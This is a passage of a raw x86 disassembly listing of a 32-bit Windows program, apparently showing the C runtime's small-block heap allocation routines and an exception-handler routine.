  4250c2:	push   0x41c4
  4250c7:	push   0x8
  4250c9:	push   DWORD PTR ds:0x466380
  4250cf:	lea    eax,[eax+eax*4]
  4250d2:	lea    esi,[ecx+eax*4]
  4250d5:	call   DWORD PTR ds:0x428030
  4250db:	cmp    eax,edi
  4250dd:	mov    DWORD PTR [esi+0x10],eax
  4250e0:	jne    0x4250e6
  4250e2:	xor    eax,eax
  4250e4:	jmp    0x425129
  4250e6:	push   0x4
  4250e8:	push   0x2000
  4250ed:	push   0x100000
  4250f2:	push   edi
  4250f3:	call   DWORD PTR ds:0x4280e4
  4250f9:	cmp    eax,edi
  4250fb:	mov    DWORD PTR [esi+0xc],eax
  4250fe:	jne    0x425112
  425100:	push   DWORD PTR [esi+0x10]
  425103:	push   edi
  425104:	push   DWORD PTR ds:0x466380
  42510a:	call   DWORD PTR ds:0x4280c4
  425110:	jmp    0x4250e2
  425112:	or     DWORD PTR [esi+0x8],0xffffffff
  425116:	mov    DWORD PTR [esi],edi
  425118:	mov    DWORD PTR [esi+0x4],edi
  42511b:	inc    DWORD PTR ds:0x46613c
  425121:	mov    eax,DWORD PTR [esi+0x10]
  425124:	or     DWORD PTR [eax],0xffffffff
  425127:	mov    eax,esi
  425129:	pop    esi
  42512a:	pop    edi
  42512b:	ret    
  42512c:	push   ebp
  42512d:	mov    ebp,esp
  42512f:	push   ecx
  425130:	push   ecx
  425131:	mov    ecx,DWORD PTR [ebp+0x8]
  425134:	mov    eax,DWORD PTR [ecx+0x8]
  425137:	push   ebx
  425138:	push   esi
  425139:	mov    esi,DWORD PTR [ecx+0x10]
  42513c:	push   edi
  42513d:	xor    ebx,ebx
  42513f:	jmp    0x425144
  425141:	shl    eax,1
  425143:	inc    ebx
  425144:	test   eax,eax
  425146:	jge    0x425141
  425148:	mov    eax,ebx
  42514a:	imul   eax,eax,0x204
  425150:	lea    eax,[eax+esi*1+0x144]
  425157:	push   0x3f
  425159:	mov    DWORD PTR [ebp-0x8],eax
  42515c:	pop    edx
  42515d:	mov    DWORD PTR [eax+0x8],eax
  425160:	mov    DWORD PTR [eax+0x4],eax
  425163:	add    eax,0x8
  425166:	dec    edx
  425167:	jne    0x42515d
  425169:	push   0x4
  42516b:	mov    edi,ebx
  42516d:	push   0x1000
  425172:	shl    edi,0xf
  425175:	add    edi,DWORD PTR [ecx+0xc]
  425178:	push   0x8000
  42517d:	push   edi
  42517e:	call   DWORD PTR ds:0x4280e4
  425184:	test   eax,eax
  425186:	jne    0x425190
  425188:	or     eax,0xffffffff
  42518b:	jmp    0x42522d
  425190:	lea    edx,[edi+0x7000]
  425196:	cmp    edi,edx
  425198:	mov    DWORD PTR [ebp-0x4],edx
  42519b:	ja     0x4251e0
  42519d:	mov    ecx,edx
  42519f:	sub    ecx,edi
  4251a1:	shr    ecx,0xc
  4251a4:	lea    eax,[edi+0x10]
  4251a7:	inc    ecx
  4251a8:	or     DWORD PTR [eax-0x8],0xffffffff
  4251ac:	or     DWORD PTR [eax+0xfec],0xffffffff
  4251b3:	lea    edx,[eax+0xffc]
  4251b9:	mov    DWORD PTR [eax],edx
  4251bb:	lea    edx,[eax-0x1004]
  4251c1:	mov    DWORD PTR [eax-0x4],0xff0
  4251c8:	mov    DWORD PTR [eax+0x4],edx
  4251cb:	mov    DWORD PTR [eax+0xfe8],0xff0
  4251d5:	add    eax,0x1000
  4251da:	dec    ecx
  4251db:	jne    0x4251a8
  4251dd:	mov    edx,DWORD PTR [ebp-0x4]
  4251e0:	mov    eax,DWORD PTR [ebp-0x8]
  4251e3:	add    eax,0x1f8
  4251e8:	lea    ecx,[edi+0xc]
  4251eb:	mov    DWORD PTR [eax+0x4],ecx
  4251ee:	mov    DWORD PTR [ecx+0x8],eax
  4251f1:	lea    ecx,[edx+0xc]
  4251f4:	mov    DWORD PTR [eax+0x8],ecx
  4251f7:	mov    DWORD PTR [ecx+0x4],eax
  4251fa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  4251ff:	xor    edi,edi
  425201:	inc    edi
  425202:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425209:	mov    al,BYTE PTR [esi+0x43]
  42520c:	mov    cl,al
  42520e:	inc    cl
  425210:	test   al,al
  425212:	mov    eax,DWORD PTR [ebp+0x8]
  425215:	mov    BYTE PTR [esi+0x43],cl
  425218:	jne    0x42521d
  42521a:	or     DWORD PTR [eax+0x4],edi
  42521d:	mov    edx,0x80000000
  425222:	mov    ecx,ebx
  425224:	shr    edx,cl
  425226:	not    edx
  425228:	and    DWORD PTR [eax+0x8],edx
  42522b:	mov    eax,ebx
  42522d:	pop    edi
  42522e:	pop    esi
  42522f:	pop    ebx
  425230:	leave  
  425231:	ret    
  425232:	push   ebp
  425233:	mov    ebp,esp
  425235:	sub    esp,0xc
  425238:	mov    ecx,DWORD PTR [ebp+0x8]
  42523b:	mov    eax,DWORD PTR [ecx+0x10]
  42523e:	push   ebx
  42523f:	push   esi
  425240:	mov    esi,DWORD PTR [ebp+0x10]
  425243:	push   edi
  425244:	mov    edi,DWORD PTR [ebp+0xc]
  425247:	mov    edx,edi
  425249:	sub    edx,DWORD PTR [ecx+0xc]
  42524c:	add    esi,0x17
  42524f:	shr    edx,0xf
  425252:	mov    ecx,edx
  425254:	imul   ecx,ecx,0x204
  42525a:	lea    ecx,[ecx+eax*1+0x144]
  425261:	mov    DWORD PTR [ebp-0xc],ecx
  425264:	mov    ecx,DWORD PTR [edi-0x4]
  425267:	and    esi,0xfffffff0
  42526a:	dec    ecx
  42526b:	cmp    esi,ecx
  42526d:	lea    edi,[ecx+edi*1-0x4]
  425271:	mov    ebx,DWORD PTR [edi]
  425273:	mov    DWORD PTR [ebp+0x10],ecx
  425276:	mov    DWORD PTR [ebp-0x4],ebx
  425279:	jle    0x4253d4
  42527f:	test   bl,0x1
  425282:	jne    0x4253cd
  425288:	add    ebx,ecx
  42528a:	cmp    esi,ebx
  42528c:	jg     0x4253cd
  425292:	mov    ecx,DWORD PTR [ebp-0x4]
  425295:	sar    ecx,0x4
  425298:	dec    ecx
  425299:	cmp    ecx,0x3f
  42529c:	mov    DWORD PTR [ebp-0x8],ecx
  42529f:	jbe    0x4252a7
  4252a1:	push   0x3f
  4252a3:	pop    ecx
  4252a4:	mov    DWORD PTR [ebp-0x8],ecx
  4252a7:	mov    ebx,DWORD PTR [edi+0x4]
  4252aa:	cmp    ebx,DWORD PTR [edi+0x8]
  4252ad:	jne    0x4252f2
  4252af:	cmp    ecx,0x20
  4252b2:	mov    ebx,0x80000000
  4252b7:	jae    0x4252d3
  4252b9:	shr    ebx,cl
  4252bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4252be:	lea    ecx,[ecx+eax*1+0x4]
  4252c2:	not    ebx
  4252c4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4252c8:	dec    BYTE PTR [ecx]
  4252ca:	jne    0x4252f2
  4252cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4252cf:	and    DWORD PTR [ecx],ebx
  4252d1:	jmp    0x4252f2
  4252d3:	add    ecx,0xffffffe0
  4252d6:	shr    ebx,cl
  4252d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4252db:	lea    ecx,[ecx+eax*1+0x4]
  4252df:	not    ebx
  4252e1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4252e8:	dec    BYTE PTR [ecx]
  4252ea:	jne    0x4252f2
  4252ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4252ef:	and    DWORD PTR [ecx+0x4],ebx
  4252f2:	mov    ecx,DWORD PTR [edi+0x8]
  4252f5:	mov    ebx,DWORD PTR [edi+0x4]
  4252f8:	mov    DWORD PTR [ecx+0x4],ebx
  4252fb:	mov    ecx,DWORD PTR [edi+0x4]
  4252fe:	mov    edi,DWORD PTR [edi+0x8]
  425301:	mov    DWORD PTR [ecx+0x8],edi
  425304:	mov    ecx,DWORD PTR [ebp+0x10]
  425307:	sub    ecx,esi
  425309:	add    DWORD PTR [ebp-0x4],ecx
  42530c:	cmp    DWORD PTR [ebp-0x4],0x0
  425310:	jle    0x4253bb
  425316:	mov    edi,DWORD PTR [ebp-0x4]
  425319:	mov    ecx,DWORD PTR [ebp+0xc]
  42531c:	sar    edi,0x4
  42531f:	dec    edi
  425320:	cmp    edi,0x3f
  425323:	lea    ecx,[ecx+esi*1-0x4]
  425327:	jbe    0x42532c
  425329:	push   0x3f
  42532b:	pop    edi
  42532c:	mov    ebx,DWORD PTR [ebp-0xc]
  42532f:	lea    ebx,[ebx+edi*8]
  425332:	mov    DWORD PTR [ebp+0x10],ebx
  425335:	mov    ebx,DWORD PTR [ebx+0x4]
  425338:	mov    DWORD PTR [ecx+0x4],ebx
  42533b:	mov    ebx,DWORD PTR [ebp+0x10]
  42533e:	mov    DWORD PTR [ecx+0x8],ebx
  425341:	mov    DWORD PTR [ebx+0x4],ecx
  425344:	mov    ebx,DWORD PTR [ecx+0x4]
  425347:	mov    DWORD PTR [ebx+0x8],ecx
  42534a:	mov    ebx,DWORD PTR [ecx+0x4]
  42534d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425350:	jne    0x4253a9
  425352:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425356:	mov    BYTE PTR [ebp+0x13],cl
  425359:	inc    cl
  42535b:	cmp    edi,0x20
  42535e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425362:	jae    0x425380
  425364:	cmp    BYTE PTR [ebp+0x13],0x0
  425368:	jne    0x425378
  42536a:	mov    ecx,edi
  42536c:	mov    ebx,0x80000000
  425371:	shr    ebx,cl
  425373:	mov    ecx,DWORD PTR [ebp+0x8]
  425376:	or     DWORD PTR [ecx],ebx
  425378:	lea    eax,[eax+edx*4+0x44]
  42537c:	mov    ecx,edi
  42537e:	jmp    0x4253a0
  425380:	cmp    BYTE PTR [ebp+0x13],0x0
  425384:	jne    0x425396
  425386:	lea    ecx,[edi-0x20]
  425389:	mov    ebx,0x80000000
  42538e:	shr    ebx,cl
  425390:	mov    ecx,DWORD PTR [ebp+0x8]
  425393:	or     DWORD PTR [ecx+0x4],ebx
  425396:	lea    eax,[eax+edx*4+0xc4]
  42539d:	lea    ecx,[edi-0x20]
  4253a0:	mov    edx,0x80000000
  4253a5:	shr    edx,cl
  4253a7:	or     DWORD PTR [eax],edx
  4253a9:	mov    edx,DWORD PTR [ebp+0xc]
  4253ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4253af:	lea    eax,[edx+esi*1-0x4]
  4253b3:	mov    DWORD PTR [eax],ecx
  4253b5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4253b9:	jmp    0x4253be
  4253bb:	mov    edx,DWORD PTR [ebp+0xc]
  4253be:	lea    eax,[esi+0x1]
  4253c1:	mov    DWORD PTR [edx-0x4],eax
  4253c4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4253c8:	jmp    0x425509
  4253cd:	xor    eax,eax
  4253cf:	jmp    0x42550c
  4253d4:	jge    0x425509
  4253da:	mov    ebx,DWORD PTR [ebp+0xc]
  4253dd:	sub    DWORD PTR [ebp+0x10],esi
  4253e0:	lea    ecx,[esi+0x1]
  4253e3:	mov    DWORD PTR [ebx-0x4],ecx
  4253e6:	lea    ebx,[ebx+esi*1-0x4]
  4253ea:	mov    esi,DWORD PTR [ebp+0x10]
  4253ed:	sar    esi,0x4
  4253f0:	dec    esi
  4253f1:	cmp    esi,0x3f
  4253f4:	mov    DWORD PTR [ebp+0xc],ebx
  4253f7:	mov    DWORD PTR [ebx-0x4],ecx
  4253fa:	jbe    0x4253ff
  4253fc:	push   0x3f
  4253fe:	pop    esi
  4253ff:	test   BYTE PTR [ebp-0x4],0x1
  425403:	jne    0x425489
  425409:	mov    esi,DWORD PTR [ebp-0x4]
  42540c:	sar    esi,0x4
  42540f:	dec    esi
  425410:	cmp    esi,0x3f
  425413:	jbe    0x425418
  425415:	push   0x3f
  425417:	pop    esi
  425418:	mov    ecx,DWORD PTR [edi+0x4]
  42541b:	cmp    ecx,DWORD PTR [edi+0x8]
  42541e:	jne    0x425462
  425420:	cmp    esi,0x20
  425423:	mov    ebx,0x80000000
  425428:	jae    0x425443
  42542a:	mov    ecx,esi
  42542c:	shr    ebx,cl
  42542e:	lea    esi,[esi+eax*1+0x4]
  425432:	not    ebx
  425434:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425438:	dec    BYTE PTR [esi]
  42543a:	jne    0x42545f
  42543c:	mov    ecx,DWORD PTR [ebp+0x8]
  42543f:	and    DWORD PTR [ecx],ebx
  425441:	jmp    0x42545f
  425443:	lea    ecx,[esi-0x20]
  425446:	shr    ebx,cl
  425448:	lea    ecx,[esi+eax*1+0x4]
  42544c:	not    ebx
  42544e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425455:	dec    BYTE PTR [ecx]
  425457:	jne    0x42545f
  425459:	mov    ecx,DWORD PTR [ebp+0x8]
  42545c:	and    DWORD PTR [ecx+0x4],ebx
  42545f:	mov    ebx,DWORD PTR [ebp+0xc]
  425462:	mov    ecx,DWORD PTR [edi+0x8]
  425465:	mov    esi,DWORD PTR [edi+0x4]
  425468:	mov    DWORD PTR [ecx+0x4],esi
  42546b:	mov    esi,DWORD PTR [edi+0x8]
  42546e:	mov    ecx,DWORD PTR [edi+0x4]
  425471:	mov    DWORD PTR [ecx+0x8],esi
  425474:	mov    esi,DWORD PTR [ebp+0x10]
  425477:	add    esi,DWORD PTR [ebp-0x4]
  42547a:	mov    DWORD PTR [ebp+0x10],esi
  42547d:	sar    esi,0x4
  425480:	dec    esi
  425481:	cmp    esi,0x3f
  425484:	jbe    0x425489
  425486:	push   0x3f
  425488:	pop    esi
  425489:	mov    ecx,DWORD PTR [ebp-0xc]
  42548c:	lea    ecx,[ecx+esi*8]
  42548f:	mov    edi,DWORD PTR [ecx+0x4]
  425492:	mov    DWORD PTR [ebx+0x8],ecx
  425495:	mov    DWORD PTR [ebx+0x4],edi
  425498:	mov    DWORD PTR [ecx+0x4],ebx
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    DWORD PTR [ecx+0x8],ebx
  4254a1:	mov    ecx,DWORD PTR [ebx+0x4]
  4254a4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4254a7:	jne    0x425500
  4254a9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4254ad:	mov    BYTE PTR [ebp+0xf],cl
  4254b0:	inc    cl
  4254b2:	cmp    esi,0x20
  4254b5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4254b9:	jae    0x4254d7
  4254bb:	cmp    BYTE PTR [ebp+0xf],0x0
  4254bf:	jne    0x4254cf
  4254c1:	mov    ecx,esi
  4254c3:	mov    edi,0x80000000
  4254c8:	shr    edi,cl
  4254ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4254cd:	or     DWORD PTR [ecx],edi
  4254cf:	lea    eax,[eax+edx*4+0x44]
  4254d3:	mov    ecx,esi
  4254d5:	jmp    0x4254f7
  4254d7:	cmp    BYTE PTR [ebp+0xf],0x0
  4254db:	jne    0x4254ed
  4254dd:	lea    ecx,[esi-0x20]
  4254e0:	mov    edi,0x80000000
  4254e5:	shr    edi,cl
  4254e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4254ea:	or     DWORD PTR [ecx+0x4],edi
  4254ed:	lea    eax,[eax+edx*4+0xc4]
  4254f4:	lea    ecx,[esi-0x20]
  4254f7:	mov    edx,0x80000000
  4254fc:	shr    edx,cl
  4254fe:	or     DWORD PTR [eax],edx
  425500:	mov    eax,DWORD PTR [ebp+0x10]
  425503:	mov    DWORD PTR [ebx],eax
  425505:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425509:	xor    eax,eax
  42550b:	inc    eax
  42550c:	pop    edi
  42550d:	pop    esi
  42550e:	pop    ebx
  42550f:	leave  
  425510:	ret    
  425511:	push   ebp
  425512:	mov    ebp,esp
  425514:	sub    esp,0x14
  425517:	mov    ecx,DWORD PTR [ebp+0x8]
  42551a:	mov    eax,ds:0x46613c
  42551f:	mov    edx,DWORD PTR ds:0x466140
  425525:	add    ecx,0x17
  425528:	and    ecx,0xfffffff0
  42552b:	push   ebx
  42552c:	mov    DWORD PTR [ebp-0x10],ecx
  42552f:	sar    ecx,0x4
  425532:	push   esi
  425533:	lea    eax,[eax+eax*4]
  425536:	push   edi
  425537:	dec    ecx
  425538:	cmp    ecx,0x20
  42553b:	lea    edi,[edx+eax*4]
  42553e:	mov    DWORD PTR [ebp-0x4],edi
  425541:	jge    0x42554e
  425543:	or     esi,0xffffffff
  425546:	shr    esi,cl
  425548:	or     DWORD PTR [ebp-0x8],0xffffffff
  42554c:	jmp    0x42555b
  42554e:	add    ecx,0xffffffe0
  425551:	or     eax,0xffffffff
  425554:	xor    esi,esi
  425556:	shr    eax,cl
  425558:	mov    DWORD PTR [ebp-0x8],eax
  42555b:	mov    eax,ds:0x466148
  425560:	mov    ebx,eax
  425562:	mov    DWORD PTR [ebp-0xc],esi
  425565:	cmp    ebx,edi
  425567:	jmp    0x42557d
  425569:	mov    ecx,DWORD PTR [ebx+0x4]
  42556c:	mov    edi,DWORD PTR [ebx]
  42556e:	and    ecx,DWORD PTR [ebp-0x8]
  425571:	and    edi,esi
  425573:	or     ecx,edi
  425575:	jne    0x425582
  425577:	add    ebx,0x14
  42557a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42557d:	mov    DWORD PTR [ebp+0x8],ebx
  425580:	jb     0x425569
  425582:	cmp    ebx,DWORD PTR [ebp-0x4]
  425585:	jne    0x4255ab
  425587:	mov    ebx,edx
  425589:	jmp    0x42559c
  42558b:	mov    ecx,DWORD PTR [ebx+0x4]
  42558e:	mov    edi,DWORD PTR [ebx]
  425590:	and    ecx,DWORD PTR [ebp-0x8]
  425593:	and    edi,esi
  425595:	or     ecx,edi
  425597:	jne    0x4255a3
  425599:	add    ebx,0x14
  42559c:	cmp    ebx,eax
  42559e:	mov    DWORD PTR [ebp+0x8],ebx
  4255a1:	jb     0x42558b
  4255a3:	cmp    ebx,eax
  4255a5:	je     0x42563f
  4255ab:	mov    DWORD PTR ds:0x466148,ebx
  4255b1:	mov    eax,DWORD PTR [ebx+0x10]
  4255b4:	mov    edx,DWORD PTR [eax]
  4255b6:	cmp    edx,0xffffffff
  4255b9:	mov    DWORD PTR [ebp-0x4],edx
  4255bc:	je     0x4255d2
  4255be:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4255c5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4255c9:	and    ecx,DWORD PTR [ebp-0x8]
  4255cc:	and    edi,esi
  4255ce:	or     ecx,edi
  4255d0:	jne    0x425608
  4255d2:	mov    edx,DWORD PTR [eax+0xc4]
  4255d8:	and    edx,DWORD PTR [ebp-0x8]
  4255db:	and    DWORD PTR [ebp-0x4],0x0
  4255df:	lea    ecx,[eax+0x44]
  4255e2:	mov    esi,DWORD PTR [ecx]
  4255e4:	and    esi,DWORD PTR [ebp-0xc]
  4255e7:	or     edx,esi
  4255e9:	mov    esi,DWORD PTR [ebp-0xc]
  4255ec:	jne    0x425605
  4255ee:	mov    edx,DWORD PTR [ecx+0x84]
  4255f4:	and    edx,DWORD PTR [ebp-0x8]
  4255f7:	inc    DWORD PTR [ebp-0x4]
  4255fa:	add    ecx,0x4
  4255fd:	mov    edi,DWORD PTR [ecx]
  4255ff:	and    edi,esi
  425601:	or     edx,edi
  425603:	je     0x4255ee
  425605:	mov    edx,DWORD PTR [ebp-0x4]
  425608:	mov    ecx,edx
  42560a:	imul   ecx,ecx,0x204
  425610:	lea    ecx,[ecx+eax*1+0x144]
  425617:	mov    DWORD PTR [ebp-0xc],ecx
  42561a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42561e:	xor    edi,edi
  425620:	and    ecx,esi
  425622:	jne    0x425691
  425624:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42562b:	and    ecx,DWORD PTR [ebp-0x8]
  42562e:	push   0x20
  425630:	pop    edi
  425631:	jmp    0x425691
  425633:	cmp    DWORD PTR [ebx+0x8],0x0
  425637:	jne    0x425644
  425639:	add    ebx,0x14
  42563c:	mov    DWORD PTR [ebp+0x8],ebx
  42563f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425642:	jb     0x425633
  425644:	cmp    ebx,DWORD PTR [ebp-0x4]
  425647:	jne    0x42566f
  425649:	mov    ebx,edx
  42564b:	jmp    0x425656
  42564d:	cmp    DWORD PTR [ebx+0x8],0x0
  425651:	jne    0x42565d
  425653:	add    ebx,0x14
  425656:	cmp    ebx,eax
  425658:	mov    DWORD PTR [ebp+0x8],ebx
  42565b:	jb     0x42564d
  42565d:	cmp    ebx,eax
  42565f:	jne    0x42566f
  425661:	call   0x425075
  425666:	mov    ebx,eax
  425668:	test   ebx,ebx
  42566a:	mov    DWORD PTR [ebp+0x8],ebx
  42566d:	je     0x425687
  42566f:	push   ebx
  425670:	call   0x42512c
  425675:	pop    ecx
  425676:	mov    ecx,DWORD PTR [ebx+0x10]
  425679:	mov    DWORD PTR [ecx],eax
  42567b:	mov    eax,DWORD PTR [ebx+0x10]
  42567e:	cmp    DWORD PTR [eax],0xffffffff
  425681:	jne    0x4255ab
  425687:	xor    eax,eax
  425689:	jmp    0x425808
  42568e:	shl    ecx,1
  425690:	inc    edi
  425691:	test   ecx,ecx
  425693:	jge    0x42568e
  425695:	mov    ecx,DWORD PTR [ebp-0xc]
  425698:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42569c:	mov    ecx,DWORD PTR [edx]
  42569e:	sub    ecx,DWORD PTR [ebp-0x10]
  4256a1:	mov    esi,ecx
  4256a3:	sar    esi,0x4
  4256a6:	dec    esi
  4256a7:	cmp    esi,0x3f
  4256aa:	mov    DWORD PTR [ebp-0x8],ecx
  4256ad:	jle    0x4256b2
  4256af:	push   0x3f
  4256b1:	pop    esi
  4256b2:	cmp    esi,edi
  4256b4:	je     0x4257bb
  4256ba:	mov    ecx,DWORD PTR [edx+0x4]
  4256bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4256c0:	jne    0x42571e
  4256c2:	cmp    edi,0x20
  4256c5:	mov    ebx,0x80000000
  4256ca:	jge    0x4256f2
  4256cc:	mov    ecx,edi
  4256ce:	shr    ebx,cl
  4256d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4256d3:	lea    edi,[eax+edi*1+0x4]
  4256d7:	not    ebx
  4256d9:	mov    DWORD PTR [ebp-0x14],ebx
  4256dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4256e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4256e4:	dec    BYTE PTR [edi]
  4256e6:	jne    0x42571b
  4256e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4256eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4256ee:	and    DWORD PTR [ebx],ecx
  4256f0:	jmp    0x42571e
  4256f2:	lea    ecx,[edi-0x20]
  4256f5:	shr    ebx,cl
  4256f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4256fa:	lea    ecx,[eax+ecx*4+0xc4]
  425701:	lea    edi,[eax+edi*1+0x4]
  425705:	not    ebx
  425707:	and    DWORD PTR [ecx],ebx
  425709:	dec    BYTE PTR [edi]
  42570b:	mov    DWORD PTR [ebp-0x14],ebx
  42570e:	jne    0x42571b
  425710:	mov    ebx,DWORD PTR [ebp+0x8]
  425713:	mov    ecx,DWORD PTR [ebp-0x14]
  425716:	and    DWORD PTR [ebx+0x4],ecx
  425719:	jmp    0x42571e
  42571b:	mov    ebx,DWORD PTR [ebp+0x8]
  42571e:	cmp    DWORD PTR [ebp-0x8],0x0
  425722:	mov    ecx,DWORD PTR [edx+0x8]
  425725:	mov    edi,DWORD PTR [edx+0x4]
  425728:	mov    DWORD PTR [ecx+0x4],edi
  42572b:	mov    ecx,DWORD PTR [edx+0x4]
  42572e:	mov    edi,DWORD PTR [edx+0x8]
  425731:	mov    DWORD PTR [ecx+0x8],edi
  425734:	je     0x4257c7
  42573a:	mov    ecx,DWORD PTR [ebp-0xc]
  42573d:	lea    ecx,[ecx+esi*8]
  425740:	mov    edi,DWORD PTR [ecx+0x4]
  425743:	mov    DWORD PTR [edx+0x8],ecx
  425746:	mov    DWORD PTR [edx+0x4],edi
  425749:	mov    DWORD PTR [ecx+0x4],edx
  42574c:	mov    ecx,DWORD PTR [edx+0x4]
  42574f:	mov    DWORD PTR [ecx+0x8],edx
  425752:	mov    ecx,DWORD PTR [edx+0x4]
  425755:	cmp    ecx,DWORD PTR [edx+0x8]
  425758:	jne    0x4257b8
  42575a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42575e:	mov    BYTE PTR [ebp+0xb],cl
  425761:	inc    cl
  425763:	cmp    esi,0x20
  425766:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42576a:	jge    0x42578f
  42576c:	cmp    BYTE PTR [ebp+0xb],0x0
  425770:	jne    0x42577d
  425772:	mov    edi,0x80000000
  425777:	mov    ecx,esi
  425779:	shr    edi,cl
  42577b:	or     DWORD PTR [ebx],edi
  42577d:	mov    ecx,esi
  42577f:	mov    edi,0x80000000
  425784:	shr    edi,cl
  425786:	mov    ecx,DWORD PTR [ebp-0x4]
  425789:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42578d:	jmp    0x4257b8
  42578f:	cmp    BYTE PTR [ebp+0xb],0x0
  425793:	jne    0x4257a2
  425795:	lea    ecx,[esi-0x20]
  425798:	mov    edi,0x80000000
  42579d:	shr    edi,cl
  42579f:	or     DWORD PTR [ebx+0x4],edi
  4257a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4257a5:	lea    edi,[eax+ecx*4+0xc4]
  4257ac:	lea    ecx,[esi-0x20]
  4257af:	mov    esi,0x80000000
  4257b4:	shr    esi,cl
  4257b6:	or     DWORD PTR [edi],esi
  4257b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4257bb:	test   ecx,ecx
  4257bd:	je     0x4257ca
  4257bf:	mov    DWORD PTR [edx],ecx
  4257c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4257c5:	jmp    0x4257ca
  4257c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4257ca:	mov    esi,DWORD PTR [ebp-0x10]
  4257cd:	add    edx,ecx
  4257cf:	lea    ecx,[esi+0x1]
  4257d2:	mov    DWORD PTR [edx],ecx
  4257d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4257d8:	mov    esi,DWORD PTR [ebp-0xc]
  4257db:	mov    ecx,DWORD PTR [esi]
  4257dd:	test   ecx,ecx
  4257df:	lea    edi,[ecx+0x1]
  4257e2:	mov    DWORD PTR [esi],edi
  4257e4:	jne    0x425800
  4257e6:	cmp    ebx,DWORD PTR ds:0x466138
  4257ec:	jne    0x425800
  4257ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4257f1:	cmp    ecx,DWORD PTR ds:0x466150
  4257f7:	jne    0x425800
  4257f9:	and    DWORD PTR ds:0x466138,0x0
  425800:	mov    ecx,DWORD PTR [ebp-0x4]
  425803:	mov    DWORD PTR [eax],ecx
  425805:	lea    eax,[edx+0x4]
  425808:	pop    edi
  425809:	pop    esi
  42580a:	pop    ebx
  42580b:	leave  
  42580c:	ret    
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   esi
  425811:	inc    ebx
  425812:	xor    dh,BYTE PTR [eax]
  425814:	pop    eax
  425815:	inc    ebx
  425816:	xor    BYTE PTR [eax],dh
  425818:	push   ebp
  425819:	mov    ebp,esp
  42581b:	sub    esp,0x8
  42581e:	push   ebx
  42581f:	push   esi
  425820:	push   edi
  425821:	push   ebp
  425822:	cld    
  425823:	mov    ebx,DWORD PTR [ebp+0xc]
  425826:	mov    eax,DWORD PTR [ebp+0x8]
  425829:	test   DWORD PTR [eax+0x4],0x6
  425830:	jne    0x4258b8
  425836:	mov    DWORD PTR [ebp-0x8],eax
  425839:	mov    eax,DWORD PTR [ebp+0x10]
  42583c:	mov    DWORD PTR [ebp-0x4],eax
  42583f:	lea    eax,[ebp-0x8]
  425842:	mov    DWORD PTR [ebx-0x4],eax
  425845:	mov    esi,DWORD PTR [ebx+0xc]
  425848:	mov    edi,DWORD PTR [ebx+0x8]
  42584b:	cmp    esi,0xffffffff
  42584e:	je     0x4258b1
  425850:	lea    ecx,[esi+esi*2]
  425853:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425858:	je     0x42589f
  42585a:	push   esi
  42585b:	push   ebp
  42585c:	lea    ebp,[ebx+0x10]
  42585f:	call   DWORD PTR [edi+ecx*4+0x4]
  425863:	pop    ebp
  425864:	pop    esi
  425865:	mov    ebx,DWORD PTR [ebp+0xc]
  425868:	or     eax,eax
  42586a:	je     0x42589f
  42586c:	js     0x4258aa
  42586e:	mov    edi,DWORD PTR [ebx+0x8]
  425871:	push   ebx
  425872:	call   0x4267a0
  425877:	add    esp,0x4
  42587a:	lea    ebp,[ebx+0x10]
  42587d:	push   esi
  42587e:	push   ebx
  42587f:	call   0x4267e2
  425884:	add    esp,0x8
  425887:	lea    ecx,[esi+esi*2]
  42588a:	push   0x1
  42588c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  425890:	call   0x426876
  425895:	mov    eax,DWORD PTR [edi+ecx*4]
  425898:	mov    DWORD PTR [ebx+0xc],eax
  42589b:	call   DWORD PTR [edi+ecx*4+0x8]
  42589f:	mov    edi,DWORD PTR [ebx+0x8]
  4258a2:	lea    ecx,[esi+esi*2]
  4258a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4258a8:	jmp    0x42584b
  4258aa:	mov    eax,0x0
  4258af:	jmp    0x4258cd
